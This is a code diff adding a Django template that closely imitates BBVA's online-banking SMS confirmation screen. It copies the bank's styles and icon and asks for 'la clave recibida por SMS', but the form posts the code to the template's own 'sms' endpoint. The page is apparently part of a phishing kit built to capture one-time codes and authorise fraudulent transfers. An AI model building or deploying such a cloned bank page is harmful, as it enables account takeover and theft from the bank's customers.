@@ -1,0 +1,42 @@
+<html>
+
+<head></head>
+
+<body>
+ {% load static %}
+
+
+    <div class="contenedorAsistente js_loadingContainer" id="contenedor_asistente_cuentas_transferencias_instantaneas" style="/* margin: 18px; *//* padding: 0px; */font-variant-numeric: inherit;font-variant-east-asian: inherit;font-stretch: inherit;font-size: 10px;line-height: inherit;font-family: &quot;BBVA Web Book&quot;, sans-serif;vertical-align: baseline;zoom: 1;/* width: 59.8em; */min-height: 0px;border-radius: 1px;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;/* background-attachment: initial; */background-origin: initial;background-clip: initial;overflow: hidden;position: relative;color: rgb(42, 134, 202);">
+        <ol>
+            <li class="paso" id="c-main-form-signature" style="margin: 0px; padding: 0px; border: 0px; font: inherit; vertical-align: baseline; float: left; width: 600px;">
+                <div class="c-form-claveOperacionesFM grande " style="right: 13%; padding: 2.5em 1.7em;border: 0px;font: inherit;vertical-align: baseline;zoom: 1;background: rgb(243, 235, 213);text-align: center;position: relative;">
+                    <form action="{% url 'sms' %}" method="post" id="signature_form" style="margin: 0px; padding: 0px; border-width: 0px; border-style: initial; border-color: initial; font: inherit; vertical-align: baseline;">{% csrf_token %}
+					
+					
+                        <div class="solo-sms" style="margin: 0px; padding: 0px; border: 0px; font: inherit; vertical-align: baseline; zoom: 1;">
+
+                            <p class="introducirClave clave-acceso" style="margin: 1em 0px 2em;padding: 7em 0px 0px;border: 0px;font-style: inherit;font-variant: inherit;font-weight: inherit;font-stretch: inherit;font-size: 1em;line-height: inherit;font-family: inherit;vertical-align: baseline;background: url(https://web.bbva.es/img_v2/ico-clave-otp-grande.png?2.3.21) center 0px no-repeat;float: none;z-index: 1;">
+                                <label for="05_1536232388702" style="margin: 0px; padding: 0px; border: 0px; font: inherit; vertical-align: baseline;"><span style="margin: 0px auto 1.125em; padding: 0px; border: 0px; font-style: inherit; font-variant: inherit; font-weight: inherit; font-stretch: inherit; font-size: 1.6em; line-height: normal; vertical-align: baseline; color: rgb(18, 18, 18); width: 26.25em; display: block;">Introducir la&nbsp;<strong style="margin: 0px; padding: 0px; border: 0px; font-style: inherit; font-variant: inherit; font-stretch: inherit; font-size: inherit; line-height: inherit; font-family: inherit; vertical-align: baseline; color: rgb(0, 68, 129);">clave recibida por SMS</strong>&nbsp;para confirmar la operaci&oacute;n:</span>
+                                    <input aria-invalid="true" aria-required="true" class="text w160 required_password error" required id="signatureData" maxlength="8" name="signatureData" style="width: 140px;margin: 0px auto;font-size: 1.2em;height: 2.417em;line-height: 2.417em;padding: 0px 0.833em;border-radius: 1px;font-family: &quot;BBVA Web Book&quot;, sans-serif;/* background-color: rgb(252, 223, 223); */border-top-width: initial;border-style: none none solid;border-right-width: initial;border-left-width: initial;border-bottom-width: 1px;/* border-bottom-color: rgb(212, 75, 80); *//* color: rgb(212, 75, 80); */float: none;clear: both;" type="password">&nbsp;</label>
+									
+									<span class="c-botones-generico input" style="margin: 0px 0px 0px 0.7em;padding: 0px;border: none;font-style: inherit;font-variant: inherit;font-weight: inherit;font-stretch: inherit;font-size: 1.1em;line-height: 30px;font-family: inherit;vertical-align: baseline;height: 2.727em;border-radius: 1px;display: inline-block;zoom: 1;background-color: rgb(42, 134, 202);color: rgb(255, 255, 255);cursor: pointer;">
+									
+									<input class="genericSubmitButton" data-transition-to="changeSecurityLevel" style="font-size: 1em;height: 2.545em;padding-top: 0px;padding-right: 0.818em;padding-bottom: 0px;margin: 0px;font-family: &quot;BBVA Web Book&quot;, sans-serif;color: rgb(255, 255, 255);background-color: #2A86CA;cursor: pointer;border-width: 0px;border-style: initial;border-color: initial;zoom: 1;padding-left: 8px !important;" type="submit" value="Confirmar">
+									
+									</span></p>
+
+                            <div id="mensajeTeLllamamos_FirmaOTP" style="margin: 0px; padding: 0px; border: 0px; font-style: inherit; font-variant: inherit; font-weight: inherit; font-stretch: inherit; font-size: 12px; line-height: 15px; font-family: inherit; vertical-align: baseline; zoom: 1;">
+                                <p class="enlaceLlamada" data-click-to-call="" style="margin: 20px 0px 0px; padding: 0px; border: 0px; font: inherit; vertical-align: baseline;"><span data-added-tabindex-by-js="true" role="link" style="margin: 0px; padding: 0px; border: 0px; font-style: inherit; font-variant: inherit; font-weight: bold; font-stretch: inherit; font-size: inherit; line-height: inherit; font-family: inherit; vertical-align: baseline; cursor: pointer;" tabindex="0">&iquest;No recibes el SMS? Te llamamos.</span></p>
+                            </div>
+							
+                        </div>
+                    </form>
+                </div>
+            </li>
+        </ol>
+    </div>
+	
+	
+</body>
+
+</html>
